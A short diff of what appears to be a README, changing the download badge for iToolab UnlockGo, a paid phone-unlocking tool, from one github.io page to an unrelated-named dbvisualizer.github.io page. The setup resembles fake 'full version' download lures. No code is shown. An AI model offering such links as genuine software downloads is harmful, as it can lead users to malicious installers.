@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://itoolab-unlockgo-full.github.io/.github">
+  <a href="https://dbvisualizer.github.io/.github/">
     <img src="https://img.shields.io/badge/⬇️_Download_iToolab_UnlockGo-blue?style=for-the-badge" alt="Download iToolab UnlockGo"/>
   </a>
 </p>
